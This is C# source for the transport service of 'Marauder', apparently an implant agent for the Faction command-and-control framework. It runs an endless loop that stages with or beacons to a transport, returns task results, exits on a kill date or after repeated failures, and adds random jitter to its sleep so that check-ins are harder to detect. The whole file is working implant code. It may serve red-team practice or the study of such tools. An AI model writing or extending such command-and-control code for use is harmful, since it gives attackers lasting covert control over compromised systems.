using System;
using System.Collections.Generic;
using System.Threading;
using System.Linq;
using Newtonsoft.Json;

using Marauder.Objects;
using Faction.Modules.Dotnet.Common;

namespace Marauder.Services
{
  public class TransportService
  {
    public event EventHandler<MessageRecievedArgs> OnMessageRecieved;

    private List<AgentTransport> Transports = new List<AgentTransport>();
    private AgentTransport PrimaryTransport;
    private AgentTransport BackupTransport;
    private int Attempts = 0;

    public void AddTransport(AgentTransport transport)
    {
      Transports.Add(transport);
    }

    public TaskResult SetPrimaryTransport(string transportName)
    {
      TaskResult resp = new TaskResult();
      AgentTransport transport = Transports.FirstOrDefault(t => t.Name == transportName);
      if (transport != null)
      {
        PrimaryTransport = transport;
        resp.Success = true;
        resp.Message = String.Format("Primary Transport set to {0}", transportName);
      }
      else
      {
        resp.Success = false;
        resp.Message = String.Format("Could not set {0} as Primary Transport", transportName);
      }
      return resp;
    }


    public void Start()
    {
      while (true)
      {
        if (State.ExpirationDate.HasValue)
        {
          int result = DateTime.Compare(DateTime.Today, State.ExpirationDate.Value);
          if (result > 0) {
#if DEBUG            
            Logging.Write("TransportService", "Payload Expired. Exiting.");
#endif      
            Environment.Exit(0);
          }
        }
#if DEBUG        
        Logging.Write("TransportService", "Starting Loop..");  
        Logging.Write("TransportService", "Clearing Completed Tasks..");
#endif
        foreach (RunningTask task in State.RunningTasks.ToList())
        {
          if (task.Task.IsFaulted)
          {
            TaskResult result = new TaskResult();
            result.TaskName = task.TaskName;
            result.Success = false;
            result.Complete = true;
            if (String.IsNullOrEmpty(task.Task.Exception.InnerException.Message))
            {
              result.Message = "Task encountered an error, but no error message is available";
            }
            else
            {
              result.Message = task.Task.Exception.InnerException.Message;
            }
            State.ResultQueue.Add(result);
          }

          if (task.Task.IsCompleted)
          {
            State.RunningTasks.Remove(task);
          }
        }

        string message = "";
        string response = "";
                
        if (!String.IsNullOrEmpty(State.Name)) {
          message = State.CryptoService.CreateAgentMessage();
          response = PrimaryTransport.Beacon(State.Name, message);
        }
        else {
          message = State.CryptoService.CreateStagingMessage();
          response = PrimaryTransport.Stage(State.PayloadName, State.StagingId, message);
        }
#if DEBUG        
        Logging.Write("TransportService", $"Got response: {response.ToString()}");
#endif  
        if (response == "ERROR")
        {
          Attempts++;
          if (Attempts > State.MaxAttempts)
          {
            Environment.Exit(0);
          }
        }
        else
        {          
          if (String.IsNullOrEmpty(response)) {
#if DEBUG            
            Logging.Write("TransportService", "Empty message recieved");
#endif      
          }
          else {
#if DEBUG            
            Logging.Write("TransportService", "Announcing Message..");
#endif      
            OnMessageRecieved(this, new MessageRecievedArgs(response));
          }
          
        }
        double sleep = State.Sleep;

        // Here we account for jitter
        if (State.Jitter > 0) {
          double offset = State.Sleep * State.Jitter;
          Random random = new Random();
          double result = random.NextDouble() * (offset - (offset * -1)) + (offset * -1);
          sleep = sleep + result;
        }
        sleep = (sleep * 1000);

#if DEBUG        
        Logging.Write("TransportService", $"Sleeping for {Convert.ToInt32(sleep)} milliseconds");
#endif  
        Thread.Sleep(Convert.ToInt32(sleep));
      }
    }

  }
}
